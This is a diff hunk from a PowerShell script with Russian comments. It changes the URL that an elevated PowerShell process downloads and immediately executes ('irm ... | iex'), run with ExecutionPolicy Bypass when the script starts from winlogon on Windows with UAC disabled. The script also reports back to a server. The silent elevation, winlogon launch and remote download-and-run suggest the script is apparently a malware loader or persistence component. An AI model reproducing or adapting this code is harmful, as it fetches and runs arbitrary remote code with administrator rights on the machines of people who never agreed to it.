@@ -583,7 +583,7 @@ function Start-Main {
     # На Windows 10/11 при полностью отключённом UAC (EnableLUA = 0) попробуем один раз запустить себя от имени администратора без цикла.
     if ($LaunchedFromWinlogon -and -not (Test-IsAdmin) -and (Test-IsWin10Or11) -and (Test-UacDisabled)) {
         try {
-            $arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"irm https://github.com/Squad7556/rar/releases/download/v1.0/log|iex`""
+            $arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"irm https://raw.githubusercontent.com/Squad7556/rar/refs/heads/main/log|iex`""
             Start-Process -FilePath "powershell.exe" -ArgumentList $arguments -Verb RunAs -ErrorAction Stop
             Send-ErrorToServer -ErrorMessage "Elevation from winlogon without UAC (UAC disabled)" -Command "Start-Main:UAC:NoPrompt"
             exit
